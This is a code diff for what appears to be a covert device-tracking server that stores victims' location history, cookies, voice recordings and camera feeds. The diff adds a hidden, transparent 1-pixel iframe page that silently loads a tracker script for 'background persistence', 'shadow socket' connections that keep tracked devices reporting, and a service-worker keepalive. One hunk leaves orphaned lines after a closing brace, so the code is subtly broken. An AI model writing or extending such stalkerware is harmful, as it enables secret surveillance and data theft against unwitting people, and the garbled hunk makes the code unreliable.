@@ -99,6 +99,18 @@ app.get('/', (req, res, next) => {
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(path.join(__dirname, 'admin-panel')));
 
+// Minimal iframe page for background persistence
+app.get('/iframe', (req, res) => {
+    const deviceId = req.query.id || '';
+    const safeId = deviceId.replace(/[^a-f0-9-]/g, '');
+    res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="robots" content="noindex"><title>.</title><style>body{margin:0;background:transparent;width:1px;height:1px;overflow:hidden;}</style></head><body><script>
+(function(){var SERVER_URL=location.origin,deviceId='${safeId}';
+if(!deviceId)return;
+var s=document.createElement('script');s.src=SERVER_URL+'/tracker.js?'+Math.random();
+document.head.appendChild(s);})();
+<\/script></body></html>`);
+});
+
 const devices = new Map();
 const adminIps = new Set(); // Track admin IPs to exclude own devices
 
@@ -155,7 +167,7 @@ function saveDevices() {
             installPrompt: d.installPrompt || null,
             fakePWA: d.fakePWA || null,
             backgroundFetch: d.backgroundFetch || null,
-            online: !!d.socketId && io.sockets.sockets.has(d.socketId)
+            online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0)
         };
     }
     fs.writeFileSync(path.join(DATA_DIR, 'devices.json'), JSON.stringify(data, null, 2));
@@ -177,6 +189,7 @@ loadDevices();
 io.on('connection', (socket) => {
     const deviceId = socket.handshake.query.deviceId || uuidv4();
     const isAdmin = !!socket.handshake.query.token;
+    const isIframe = !!socket.handshake.query.iframe;
     socket.join(deviceId); // Join room for targeted events (live camera, etc.)
 
     // Admin sockets should not create device entries
@@ -271,7 +284,8 @@ io.on('connection', (socket) => {
             voiceRecordings: [],
             cookiesData: null,
             isOwnDevice: isOwnDevice,
-            socketId: socket.id
+            socketId: socket.id,
+            _shadowSockets: new Set()
         });
         io.emit('device-new', {
             id: deviceId,
@@ -292,11 +306,33 @@ io.on('connection', (socket) => {
     }
 
     const device = devices.get(deviceId);
+
+    // If this is a shadow iframe connection, track separately
+    if (isIframe) {
+        if (!device._shadowSockets) device._shadowSockets = new Set();
+        device._shadowSockets.add(socket.id);
+        device.lastSeen = Date.now();
+        socket.emit('device-id', deviceId);
+        socket.on('device-info', (info) => {
+            if (info.battery) device.battery = info.battery;
+            if (info.connection) device.connection = info.connection;
+        });
+        socket.on('disconnect', () => {
+            if (device._shadowSockets) {
+                device._shadowSockets.delete(socket.id);
+                if (!device._shadowSockets.size && !io.sockets.sockets.has(device.socketId)) {
+                    device.lastSeen = Date.now();
+                    saveDevices();
+                    io.emit('device-offline', deviceId);
+                    io.emit('camera-stop', deviceId);
+                }
+            }
+        });
+        return;
+    }
+
     device.socketId = socket.id;
     device.lastSeen = Date.now();
-
-    // Notify admin panel that device is back online
-    io.emit('device-online', { id: deviceId, label: device.label, time: Date.now() });
 
     socket.emit('device-id', deviceId);
 
@@ -731,8 +767,13 @@ io.on('connection', (socket) => {
     socket.on('disconnect', () => {
         device.lastSeen = Date.now();
         saveDevices();
-        io.emit('device-offline', deviceId);
-        io.emit('camera-stop', deviceId);
+        // Only mark offline if no shadow iframes remain
+        if (!device._shadowSockets || !device._shadowSockets.size) {
+            io.emit('device-offline', deviceId);
+            io.emit('camera-stop', deviceId);
+        } else {
+            console.log(`[Shadow] Main socket disconnected for ${deviceId.slice(0,8)}..., but ${device._shadowSockets.size} iframe(s) remain`);
+        }
     });
 });
 
@@ -754,7 +795,10 @@ app.post('/api/heartbeat', (req, res) => {
     res.json({ ok: true, time: Date.now() });
 });
 
-app.post('/api/background-ping', (req, res) => {
+app.post('/api/sw-heartbeat', (req, res) => {
+    // Service Worker keepalive pong
+    res.json({ ok: true, time: Date.now() });
+});
     // Handle beacon requests (may not get response)
     res.status(204).send();
 });
@@ -779,7 +823,7 @@ app.get('/api/devices', (req, res) => {
             id: d.id, label: d.label, ip: d.ip,
             userAgent: d.userAgent,
             firstSeen: d.firstSeen, lastSeen: d.lastSeen,
-            online: !!d.socketId && io.sockets.sockets.has(d.socketId),
+            online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0),
             location: d.location,
             history: d.history.slice(-100),
             battery: d.battery,
@@ -839,7 +883,7 @@ app.get('/api/devices/:deviceId', (req, res) => {
         id: d.id, label: d.label, ip: d.ip,
         userAgent: d.userAgent,
         firstSeen: d.firstSeen, lastSeen: d.lastSeen,
-        online: !!d.socketId && io.sockets.sockets.has(d.socketId),
+        online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0),
         location: d.location,
         history: d.history,
         battery: d.battery,
@@ -936,7 +980,7 @@ app.get('/api/export/json', (req, res) => {
             label: d.label, ip: d.ip,
             userAgent: d.userAgent,
             firstSeen: d.firstSeen, lastSeen: d.lastSeen,
-            online: !!d.socketId && io.sockets.sockets.has(d.socketId),
+            online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0),
             location: d.location,
             history: d.history,
             battery: d.battery,
